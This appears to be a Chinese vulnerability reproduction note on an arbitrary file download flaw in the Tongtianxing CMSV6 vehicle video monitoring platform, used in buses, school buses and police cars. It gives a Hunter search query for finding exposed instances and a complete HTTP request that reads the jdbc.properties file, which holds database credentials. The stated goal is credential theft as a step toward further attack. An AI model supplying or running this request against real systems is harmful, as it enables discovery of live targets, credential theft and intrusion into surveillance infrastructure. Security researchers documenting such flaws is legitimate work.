# 通天星CMSV6车载视频监控平台 MobileAction_downLoad存在任意文件下载漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台存在任意文件下载漏洞，攻击者可通过此漏洞下载敏感文件信息，获取数据库账号密码，从而为下一步攻击做准备。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/O6cMOOUOshBGj0hG/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-535114.png)

# 四、漏洞复现
```plain
GET /808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: language=zh; style=1; EnableAESLogin=0; maintitle=%u5317%u6597%u4E3B%u52A8%u5B89%u5168%u4E91%u5E73%u53F0; name=value; JSESSIONID=91A2BB4151F3DCBD654371B8E33B7221
Upgrade-Insecure-Requests: 1
```

![1699407453347-449fe4b6-8e51-4242-becb-b8dbe12b9312.png](./img/O6cMOOUOshBGj0hG/1699407453347-449fe4b6-8e51-4242-becb-b8dbe12b9312-854633.png)



> 更新: 2024-12-28 13:05:36  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/af5xnrnru81i15zt>